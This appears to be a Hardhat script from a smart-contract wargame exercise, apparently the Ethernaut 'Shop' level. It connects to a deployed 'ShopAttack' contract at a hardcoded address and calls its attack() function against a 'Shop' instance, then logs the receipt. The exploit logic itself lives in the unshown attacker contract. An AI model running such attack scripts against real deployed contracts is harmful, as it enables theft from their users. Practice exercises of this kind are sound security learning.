const { ethers } = require("hardhat");

const ATTACKER_ADDRESS = "0x7D8be210efe4B4E1cDa0cd66bE7fC80302e11631";
const INSTANCE_ADDRESS = "0x13Eb2F484E67966F61B002fbB7e68CDb109375C7";

async function main() {
    const shopAttacker = await ethers.getContractAt("ShopAttack", ATTACKER_ADDRESS);
    const instance = await ethers.getContractAt("Shop", INSTANCE_ADDRESS);

    // Execute the attack.
    const transferTx = await shopAttacker.attack();
    const attackReceipt = await transferTx.wait();
    console.log("attackReceipt: ", attackReceipt);


}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});